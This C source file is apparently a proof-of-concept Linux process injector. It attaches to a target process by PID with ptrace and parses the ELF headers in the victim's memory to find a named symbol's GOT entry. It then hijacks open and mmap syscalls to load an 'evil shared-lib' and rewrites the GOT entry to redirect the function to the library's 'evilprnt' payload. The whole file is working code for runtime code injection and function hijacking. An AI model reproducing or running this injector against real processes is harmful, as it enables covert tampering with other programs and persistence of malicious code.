#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <assert.h>
#include <errno.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/syscall.h>

#include <elf.h>



#define always_inline __attribute__((always_inline)) inline


#define power(x, y)                       \
    ({                                    \
        int _ret = x;                     \
        for (int i = 0; i < (y - 1); ++i) \
            _ret *= x;                    \
        _ret;                             \
    })


#define FUNC_SUCCESS 0x1
#define FUNC_FAILURE !FUNC_SUCCESS


#define __error(prnt_func, msg) \
    {                           \
        prnt_func(msg);         \
        return FUNC_FAILURE;    \
    }


#define __strlen(addr)             \
    ({                             \
        size_t len = 0;            \
        char *sptr = (char *)addr; \
        while (sptr[len] != 0)     \
            ++len;                 \
        len;                       \
	})


#define STR_EQUAL     0x1
#define STR_NOT_EQUAL !STR_EQUAL
#define __str_is_equal(str1, str2, sz)    \
    ({                                    \
        long __ret = STR_NOT_EQUAL;       \
        if (strncmp(str1, str2, sz) == 0) \
            __ret = STR_EQUAL;            \
        __ret;                            \
    })


#define GET_MULTIPLE_OF_LONG_BUF_SIZE(x) \
    ((x) % sizeof(long) ? ((x) - ((x) % sizeof(long))) + sizeof(long) : x )


struct victim_proc_struct {
    char *victim_symbol_name;
    pid_t pid;
	struct user_regs_struct regs;
    struct {
        char *base_address;
        Elf64_Addr victim_got_entry_address;
        Elf64_Addr victim_got_entry_orig_content;
        struct {
            Elf64_Addr base_address;
            Elf64_Xword memsz;
        }text_segment, data_segment, dyn_segment;
    }mem;
    struct {
        int fd;
        char *mmap_address;
        char *path;
        Elf64_Addr entrypoint;
        struct {
            Elf64_Addr base_address;
            Elf64_Off fileoffset;
            Elf64_Xword filesz;
            Elf64_Xword memsz;
        }text_segment, data_segment;
    }evil_lib;
}victim_process;




long process_attach(void)
{
   printf("attaching to victim process...\t");

   if (ptrace(PTRACE_ATTACH, victim_process.pid, 0, 0) < 0)
       __error(perror, "error @ line [309]");
   waitpid(victim_process.pid, 0, 0);

   printf("[done]\n");

   return FUNC_SUCCESS;
}

long process_detach(void)
{
    printf("detaching from victim process...\t");
    
    if (ptrace(PTRACE_DETACH, victim_process.pid, 0, 0)  < 0)
        __error(perror, "error @ line [318]");

    printf("[done]\n");

    return FUNC_SUCCESS;
}



long locate_victim_got_entry()
{
    printf("searching for victim got entry...\t");

    struct user_regs_struct regs;
    for (;;) {
        if (ptrace(PTRACE_SYSCALL, 
                   victim_process.pid, 0x0, 0x0) < 0)
            __error(perror, "error @ line [114]");
        waitpid(victim_process.pid, 0, 0);

        if ((ptrace(PTRACE_GETREGS, 
                    victim_process.pid, 0, &regs) < 0))
            __error(perror, "error @ line [119]");

        /*
         * [+] should check for other system calls that will have a pointer to address
         *     in the data segment as one of it's arguments
         *     for this Poc i check for write syscall only
         * [+] the argument could be a stack address so we must filter against this
         *     (considering the stack and heap locations in the process layout it's 
         *      easier to substract from the base of the heap to get the address from
         *      which the searching for the start of the elf begins)
        */
        if (regs.orig_rax == SYS_write) {
            /*
             * pointer to data in the stack ?
            */
            if (((regs.rsi >> 40) & 0xff) == 0x7f)
                continue;
            char* saddr = (char *)((regs.rsi & (~0xfff)) - 0x2000000);
            for (unsigned long data = 0; (data & 0xff) != '\x7f';) {
                data = ptrace(PTRACE_PEEKTEXT,
                              victim_process.pid,
                              saddr++,
                              0x0);
            }
            victim_process.mem.base_address = --saddr;
            if (ptrace(PTRACE_SYSCALL,
                       victim_process.pid, 0x0, 0x0) < 0)
                __error(perror, "error @ line [142]");
            waitpid(victim_process.pid, 0x0, 0x0);
            break;
        }
    }

    long *dummy_ptr = (long *)victim_process.mem.base_address;
    long vehdr[GET_MULTIPLE_OF_LONG_BUF_SIZE(sizeof(Elf64_Ehdr))];
    Elf64_Ehdr *vehdr_ptr = (Elf64_Ehdr *)vehdr;
    for (uint64_t x = 0; x < (sizeof(vehdr) / sizeof(long)); x++) {
        long data = ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           dummy_ptr++,
                           0x0);
        vehdr[x] = data;
    }

    dummy_ptr = (long *)(victim_process.mem.base_address + vehdr_ptr->e_phoff);
    long vphdr_size = 
        GET_MULTIPLE_OF_LONG_BUF_SIZE(sizeof(Elf64_Phdr) * vehdr_ptr->e_phnum);
    long vphdr[vphdr_size];
    Elf64_Phdr *vphdr_ptr = (Elf64_Phdr *)vphdr;
    for (unsigned long x = 0; x < (sizeof(vphdr) / sizeof(long)); x++) {
        long data = ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           dummy_ptr++,
                           0x0);
        vphdr[x] = data;
    }


    Elf64_Phdr *tmp_phdr_ptr = vphdr_ptr;
    for (unsigned long x = 0; x < vehdr_ptr->e_phnum; x++) {
        switch (tmp_phdr_ptr->p_type) {
            case PT_LOAD:
                if (tmp_phdr_ptr->p_flags & PF_X) {
                    victim_process.mem.text_segment.base_address =
                        tmp_phdr_ptr->p_vaddr ?
                        tmp_phdr_ptr->p_vaddr :
                        (Elf64_Addr)victim_process.mem.base_address;
                    victim_process.mem.text_segment.memsz =
                        tmp_phdr_ptr->p_memsz;
                }else {
                    victim_process.mem.data_segment.base_address =
                        tmp_phdr_ptr->p_vaddr > (Elf64_Addr)victim_process.mem.base_address ?
                        tmp_phdr_ptr->p_vaddr :
                        (Elf64_Addr)(victim_process.mem.base_address +
                                     tmp_phdr_ptr->p_vaddr);
                    victim_process.mem.data_segment.memsz =
                        tmp_phdr_ptr->p_memsz;
                }
                break;
            case PT_DYNAMIC:
                victim_process.mem.dyn_segment.base_address =
                    tmp_phdr_ptr->p_vaddr > (Elf64_Addr)victim_process.mem.base_address ?
                    tmp_phdr_ptr->p_vaddr :
                    (Elf64_Addr)(victim_process.mem.base_address +
                                 tmp_phdr_ptr->p_vaddr);
                victim_process.mem.dyn_segment.memsz =
                    tmp_phdr_ptr->p_memsz;
                break;
        }
        tmp_phdr_ptr++;
    }


    dummy_ptr = (long *)victim_process.mem.dyn_segment.base_address;
    long vdyn_table_size =
        GET_MULTIPLE_OF_LONG_BUF_SIZE(victim_process.mem.dyn_segment.memsz);
    long vdyn_table[vdyn_table_size];
    Elf64_Dyn *vdyn_ptr = (Elf64_Dyn *)vdyn_table;
    for (unsigned long x = 0; x < (sizeof(vdyn_table) / sizeof(long)); x++) {
        long data = ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           dummy_ptr++,
                           0x0);
        vdyn_table[x] = data;
    }

    Elf64_Rela *vpltrel_table_address;
    Elf64_Sword vpltrel_table_size;
    Elf64_Sym *vsym_table_address;
    char *vstr_table_address;
    long vstr_table_size;
    for (;vdyn_ptr->d_tag != DT_NULL; vdyn_ptr++) {
        switch (vdyn_ptr->d_tag) {
            case DT_JMPREL:
                vpltrel_table_address = (Elf64_Rela *)vdyn_ptr->d_un.d_ptr;
                break;
            case DT_PLTRELSZ:
                 vpltrel_table_size = (Elf64_Sword)vdyn_ptr->d_un.d_val;
                break;
            case DT_SYMTAB:
                vsym_table_address = (Elf64_Sym *)vdyn_ptr->d_un.d_ptr;
                break;
            case DT_STRTAB:
                vstr_table_address = (char *)vdyn_ptr->d_un.d_ptr;
                break;
            case DT_STRSZ:
                vstr_table_size =
                    GET_MULTIPLE_OF_LONG_BUF_SIZE(vdyn_ptr->d_un.d_val);
                break;
        }
    }


    long vstr_table[vstr_table_size];
    dummy_ptr = (long *)vstr_table_address;
    char *vstr_table_ptr = (char *)vstr_table;
    for (unsigned long x = 0; x < (sizeof(vstr_table) / sizeof(long)); x++) {
        long data = ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           dummy_ptr++,
                           0x0);
        vstr_table[x] = data;
    }


    dummy_ptr = (long *)vpltrel_table_address;
    long vpltrel_size = GET_MULTIPLE_OF_LONG_BUF_SIZE(vpltrel_table_size);
    long vpltrel_table[vpltrel_size];
    Elf64_Rela *vpltrel_ptr = (Elf64_Rela *)vpltrel_table;
    for (unsigned long x = 0; x < (sizeof(vpltrel_table) / sizeof(long)); x++) {
        long data = ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           dummy_ptr++,
                           0x0);
        vpltrel_table[x] = data;
    }


#define VICTIM_SYMBOL_FOUND     0x1
#define VICTIM_SYMBOL_NOT_FOUND !VICTIM_SYMBOL_FOUND
    long found_victim_symbol = VICTIM_SYMBOL_NOT_FOUND;
    for (unsigned long x = 0; x < (vpltrel_table_size / sizeof(Elf64_Rela)); x++) {
        Elf64_Sym *sym = &vsym_table_address[ELF64_R_SYM(vpltrel_ptr->r_info)];
        
        long data = ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           sym,
                           0x0);
        long sym_strtab_indx = (data & 0xffffffff);

        if (__str_is_equal(victim_process.victim_symbol_name,
                           &vstr_table_ptr[sym_strtab_indx],
                           strlen(victim_process.victim_symbol_name))) {
            found_victim_symbol = VICTIM_SYMBOL_FOUND;
            victim_process.mem.victim_got_entry_address =
                vpltrel_ptr->r_offset > (Elf64_Off)victim_process.mem.base_address ?
                vpltrel_ptr->r_offset :
                (Elf64_Addr)(victim_process.mem.base_address + vpltrel_ptr->r_offset);
        }
        vpltrel_ptr++;
    }
    if (!found_victim_symbol)
        __error(printf, "symbol not found in target process\n");

    printf("[done]\n");
    
    return FUNC_SUCCESS;
}


/*
get the segment informations for our evil shared lib
*/
long evil_lib_get_info(void)
{
    printf("getting segment informations for the evil shared-lib...\t");

    int fd;
    struct stat stat;
    char *mmap_address;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;

    if ((fd = open(victim_process.evil_lib.path, O_RDONLY)) < 0)
        __error(perror, "error @ line [335]");

    if (fstat(fd, &stat) < 0)
        __error(perror, "error @ line [338]");

    mmap_address = mmap(NULL, stat.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mmap_address == MAP_FAILED)
        __error(perror, "error @ line [341]");


    /*
    no elf sanity checks are made
    */

    ehdr = (Elf64_Ehdr *)mmap_address;
    phdr = (Elf64_Phdr *)(mmap_address + ehdr->e_phoff);

    for (unsigned long x = 0; x < ehdr->e_phnum; phdr++, ++x) {
        if (phdr->p_type == PT_LOAD) {
            if (phdr->p_flags & PF_X) {
                victim_process.evil_lib.text_segment.base_address = phdr->p_vaddr;
                victim_process.evil_lib.text_segment.filesz = phdr->p_filesz;
                victim_process.evil_lib.text_segment.fileoffset = phdr->p_offset;
                victim_process.evil_lib.text_segment.memsz = phdr->p_memsz;
            }else {
                victim_process.evil_lib.data_segment.base_address = phdr->p_vaddr;
                victim_process.evil_lib.data_segment.filesz = phdr->p_filesz;
                victim_process.evil_lib.data_segment.fileoffset = phdr->p_offset;
                victim_process.evil_lib.data_segment.memsz = phdr->p_memsz;
            }
        }
    }

    munmap(mmap_address, stat.st_size);
    close(fd);

    printf("[done]\n");

    return FUNC_SUCCESS;
}

long inject_evil_sharedlib(void)
{
    printf("injecting the evil shared-lib into the victim process...\t");

    long victim_process_orig_data[GET_MULTIPLE_OF_LONG_BUF_SIZE(1024)];

    struct user_regs_struct tmp_user_regs;

#define FLAG_OPEN_EVIL_LIB_EXEC 1
#define FLAG_MMAP_EVIL_LIB_TEXT 2
#define FLAG_MMAP_EVIL_LIB_DATA 4
    unsigned long flag = FLAG_OPEN_EVIL_LIB_EXEC;
    
    
    //save victim's old data segment contents and override it with zero bytes
    long *victim_process_data_address_ptr = (long *)victim_process.mem.data_segment.base_address;
    for (unsigned long x = 0; x <  GET_MULTIPLE_OF_LONG_BUF_SIZE(64); ++x) {
        long vdata = ptrace(PTRACE_PEEKTEXT, victim_process.pid, 
            victim_process_data_address_ptr, 0);
        victim_process_orig_data[x] = vdata;
        if (ptrace(PTRACE_POKETEXT, victim_process.pid, 
                victim_process_data_address_ptr++, 0x0) < 0)
            __error(perror, "error @ line [394]");
    }

#define NUM_OF_INTERCEPTED_SYSCALLS 3
    for (unsigned long x = 0; x != NUM_OF_INTERCEPTED_SYSCALLS; ++x) {
        if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
            __error(perror, "error @ line [401]");
        waitpid(victim_process.pid, 0, 0);

        if (ptrace(PTRACE_GETREGS, 
                victim_process.pid, 0, &victim_process.regs) < 0)
            __error(perror, "error @ line [405]");
        tmp_user_regs = victim_process.regs;

        /*
         * exceute SYS_open
        */
        if (flag == FLAG_OPEN_EVIL_LIB_EXEC) {
            size_t len = __strlen(victim_process.evil_lib.path);

            //we want a sizeof(long) aligned data segment writes
            size_t aligned_size = 
                len % sizeof(long) ? (len + (sizeof(long) - len % sizeof(long))): len;

            //insert our evil lib path into the victim's data segment
#define NUM_OF_BITS_IN_BYTE 8
            long *path = (long *)victim_process.evil_lib.path;
            victim_process_data_address_ptr = (long *)victim_process.mem.data_segment.base_address;
            for (unsigned long x = 0; x != (aligned_size / sizeof(long)); ++x) {
                /*
                 * we are copying last word and the lib path len is not sizeof(long) alinged
                 * then ensure that the padding bytes are zeros
                */
                long tmp = *path++;
                if (( x == (aligned_size/sizeof(long) - 1)) && (len % sizeof(long)))
                    tmp &= (0xffffffffffffffff >> ((aligned_size - len) * NUM_OF_BITS_IN_BYTE));
                if (ptrace(PTRACE_POKETEXT, victim_process.pid, 
                        victim_process_data_address_ptr++, tmp) < 0)
                    __error(perror, "error @ line [431]"); 
            }
            
            
            tmp_user_regs.rdi = victim_process.mem.data_segment.base_address;
            tmp_user_regs.rsi = O_RDONLY;
            tmp_user_regs.rdx = 0;
            tmp_user_regs.orig_rax = SYS_open;

            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [442]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [445]");
            waitpid(victim_process.pid, 0, 0);

            if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [449]");

            if (tmp_user_regs.rax < 0)
                __error(perror, "error @ line [452]");
            victim_process.evil_lib.fd = tmp_user_regs.rax;

            /*
             * execute the intercepted syscall
            */
            tmp_user_regs.rip = victim_process.regs.rip - 2;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [460]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [463]");
            waitpid(victim_process.pid, 0, 0);

            tmp_user_regs = victim_process.regs;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [468]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [471]");
            waitpid(victim_process.pid, 0, 0);

            flag = FLAG_MMAP_EVIL_LIB_TEXT;
        }
        /*
         * execute SYS_mmap
         * [1] mmap the text segment of the our shared lib
        */
        else if (flag == FLAG_MMAP_EVIL_LIB_TEXT) {
            tmp_user_regs.rdi = 0;
            tmp_user_regs.rsi = victim_process.evil_lib.text_segment.memsz;
            tmp_user_regs.rdx = PROT_READ | PROT_EXEC;
            tmp_user_regs.r10 = MAP_PRIVATE;
            tmp_user_regs.r8  = victim_process.evil_lib.fd;
            tmp_user_regs.r9  = 0;
            tmp_user_regs.orig_rax = SYS_mmap;

            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [492]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [495]");
            waitpid(victim_process.pid, 0, 0);

            if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [499]");

            if ((long)tmp_user_regs.rax < 0)
                __error(perror, "error @ line [502]");

            victim_process.evil_lib.mmap_address = (char *)tmp_user_regs.rax;
            
            /*
             * execute the intercepted syscall
            */
            tmp_user_regs.rip = victim_process.regs.rip - 2;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [511]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [514]");
            waitpid(victim_process.pid, 0, 0);

            tmp_user_regs = victim_process.regs;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [519]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [522]");
            waitpid(victim_process.pid, 0, 0);

            flag = FLAG_MMAP_EVIL_LIB_DATA;
        }
        /*
         * [2] mmap the data segment of our shared lib 
        */
         else if (flag == FLAG_MMAP_EVIL_LIB_DATA) {
            tmp_user_regs.rdi = 
               (long)(victim_process.evil_lib.mmap_address + 
                      victim_process.evil_lib.data_segment.base_address) & ~0xfff;
            tmp_user_regs.rsi = 
                victim_process.evil_lib.data_segment.fileoffset + 
                victim_process.evil_lib.data_segment.memsz;
            tmp_user_regs.rdx = PROT_READ | PROT_WRITE;
            tmp_user_regs.r10 = MAP_PRIVATE;
            tmp_user_regs.r8  = victim_process.evil_lib.fd;
            tmp_user_regs.r9  = 0;
            tmp_user_regs.orig_rax = SYS_mmap;

            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [545]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [548]");
            waitpid(victim_process.pid, 0, 0);

            if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [552]");

            if (tmp_user_regs.rax < 0)
                __error(perror, "error @ line [555]");
            
            /*
             * execute the intercepted syscall
            */
            tmp_user_regs.rip = victim_process.regs.rip - 2;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [562]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [565]");
            waitpid(victim_process.pid, 0, 0);

            tmp_user_regs = victim_process.regs;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [570]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [573]");
            waitpid(victim_process.pid, 0, 0);
         }
    }

    printf("[done]\n");

    printf("hijacking the target got entry in the victim process...\t");

    /*
     * [+] get the evil_print() address in out mmaped() shared lib
     * [+] search for the offset to apply the patch
     * [+] those addresses belongs to the remote process so there must
     *     be ptrace()'s PEEKTEXT to pares the data
    */
    long *evillib_start_address = (long *)victim_process.evil_lib.mmap_address;
    
    //sizeof Elf64_Ehdr is assumed to be multiple the sizeof long
    long evillib_ehdr_buf[GET_MULTIPLE_OF_LONG_BUF_SIZE(sizeof(Elf64_Ehdr))];
    for (uint32_t x = 0; x < GET_MULTIPLE_OF_LONG_BUF_SIZE(sizeof(Elf64_Ehdr)); x++) {
        long data = ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           evillib_start_address++,
                           0x0);
        evillib_ehdr_buf[x] = data;
    }

    long *evillib_phdr_address = 
        (long *)(victim_process.evil_lib.mmap_address + ((Elf64_Ehdr *)evillib_ehdr_buf)->e_phoff);
    
    long evillib_phdr_sz = ((Elf64_Ehdr *)evillib_ehdr_buf)->e_phnum * sizeof(Elf64_Phdr);
    long evillib_phdr_buf[GET_MULTIPLE_OF_LONG_BUF_SIZE(evillib_phdr_sz)];
    for (uint32_t x = 0; x < GET_MULTIPLE_OF_LONG_BUF_SIZE(evillib_phdr_sz); x++) {
        long data = ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           evillib_phdr_address++,
                           0x0);
        evillib_phdr_buf[x] = data;
    }


    Elf64_Ehdr *evil_tmp_ehdr = (Elf64_Ehdr *)evillib_ehdr_buf;
    Elf64_Phdr *evil_tmp_phdr = (Elf64_Phdr *)evillib_phdr_buf;
    long *evillib_dyn_address;
    for (Elf64_Half x = 0; x < evil_tmp_ehdr->e_phnum; x++) {
        if (evil_tmp_phdr[x].p_type == PT_DYNAMIC) {
            evillib_dyn_address =
                (long *)(victim_process.evil_lib.mmap_address + 
                         evil_tmp_phdr[x].p_vaddr);
        }
    }

    Elf64_Dyn *tmp_dyn_ptr = (Elf64_Dyn *)evillib_dyn_address;
    long *evillib_symtab_address;
    long *evillib_strtab_address;
    long evillib_strtab_sz;
    for (uint32_t x = 0;x == 0;) {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                           tmp_dyn_ptr, 
                           0x0);
        
        switch (data) {
            case DT_SYMTAB:
                evillib_dyn_address = (long *)tmp_dyn_ptr;
                long evillib_symtab_offset = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                                    ++evillib_dyn_address,
                                                    0x0);
                evillib_symtab_address = 
                    (long *)(victim_process.evil_lib.mmap_address +
                            evillib_symtab_offset);
                break;
            case DT_STRTAB:
                evillib_strtab_address = (long *)tmp_dyn_ptr;
                long evillib_strtab_offset = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                                    ++evillib_strtab_address,
                                                    0x0);
                evillib_strtab_address = 
                    (long *)(victim_process.evil_lib.mmap_address +
                             evillib_strtab_offset);
                break;
            case DT_STRSZ:
                evillib_dyn_address = (long *)tmp_dyn_ptr;
                evillib_strtab_sz = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                           ++evillib_dyn_address,
                                           0x0);
                break;
            case DT_NULL:
                x++;
        }
        tmp_dyn_ptr++;
    }


    long evillib_strtab_buf[GET_MULTIPLE_OF_LONG_BUF_SIZE(evillib_strtab_sz)];
    long *tmp_strtab_ptr = evillib_strtab_address;
    for (uint32_t x = 0; x < (sizeof(evillib_strtab_buf) / sizeof(long)); x++) {
        long data = ptrace(PTRACE_PEEKTEXT, 
                          victim_process.pid,
                          tmp_strtab_ptr++, 
                          0x0);
        evillib_strtab_buf[x] = data;
    }
        
    
    Elf64_Sym *tmp_symtab_ptr = (Elf64_Sym *)evillib_symtab_address;
    while (1) {
#define EVILLIB_ENTRYPOINT_SYMBOL_NAME "evilprnt"
        long syment_first_half = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                        evillib_symtab_address, 
                                        0x0);
        long syment_strtab_indx = syment_first_half & (0xffffffff);
        
        long syment_value = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                   ++evillib_symtab_address, 
                                   0x0);

        char *sym_name = (char *)evillib_strtab_buf + syment_strtab_indx;
        if (__str_is_equal(EVILLIB_ENTRYPOINT_SYMBOL_NAME,
                           sym_name, strlen(EVILLIB_ENTRYPOINT_SYMBOL_NAME))) {
            victim_process.evil_lib.entrypoint =
                (Elf64_Addr)(victim_process.evil_lib.mmap_address +
                             syment_value);
            /* this block will surely get excuted
             * so it's fine to set the only break for the while loop
             * inside this if block
             *
             * breaking the loop here could be replaced with checking
             * if @evillib_symtab_address == @evillib_strtab_address
             * nearly all the Elfs i've worked with have the dynamic string table
             * alongside the dynamic symbol table with start_dyn_string_tab == end_dyn_symbol_table
            */
            break;
        }

        evillib_symtab_address = (long *)(++tmp_symtab_ptr);
    }

    victim_process.mem.victim_got_entry_orig_content =
        (Elf64_Addr)ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           victim_process.mem.victim_got_entry_address,
                           0x0);

    if (ptrace(PTRACE_POKETEXT,
               victim_process.pid,
               victim_process.mem.victim_got_entry_address,
               victim_process.evil_lib.entrypoint) < 0x0)
        __error(perror, "error @ line [713]");

    /*
     * patching the evil payload to transfer execution to the hijacked function
    */
    char *evillib_entrypoint_address =
        (char *)victim_process.evil_lib.entrypoint;
    for (unsigned long data = 0; data != 0xdeadbeefcafebabe;)
        data = ptrace(PTRACE_PEEKTEXT,
                      victim_process.pid,
                      evillib_entrypoint_address++,
                      0x0);
    /*
     * 0xb ?
     * - 2 opcodes for jmp [rax] 
     * - 8 for the address to be patched
     * - 1 for positioning the address @ start of 0xdeadbeefcafebabe qword
    */
    evillib_entrypoint_address -= 0xb;

    
    if (ptrace(PTRACE_POKETEXT,
               victim_process.pid,
               evillib_entrypoint_address,
               victim_process.mem.victim_got_entry_orig_content) < 0)
        __error(perror, "error @ line [738]");

    printf("[done]\n");

    return FUNC_SUCCESS;
    
}


long main(int argc, char **argv)
{
    assert(argc == 4);
	
    victim_process.victim_symbol_name = argv[2];
    victim_process.evil_lib.path = argv[3];
    
    victim_process.pid = (pid_t)atol(argv[1]);
    if (victim_process.pid == 0) {
        printf("no process exist with provided id\n");
        return EXIT_FAILURE;
    }

    if (!(evil_lib_get_info()       && 
          process_attach()          &&
          locate_victim_got_entry() &&
          inject_evil_sharedlib()   &&
          process_detach()))
        return EXIT_FAILURE;

    return EXIT_SUCCESS;
}




